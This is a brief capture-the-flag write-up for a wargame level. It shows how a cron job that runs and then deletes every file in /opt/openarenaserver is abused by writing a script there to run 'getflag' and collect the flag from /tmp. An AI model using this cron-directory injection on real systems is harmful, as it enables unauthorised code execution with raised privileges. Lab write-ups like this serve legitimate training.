The message on login read "You've got new mail".
Looking at /var/mail/level05, you could see a cron rule that executed every 2 minutes.
It executed every file in /opt/openarenaserver and deleted it after.
	echo "getflag > /tmp/flag05" > /opt/openarenaserver/script.sh
	ls -l /opt/openarenaserver
	script.sh
...wait 2 mins
	cat /tmp/flag05

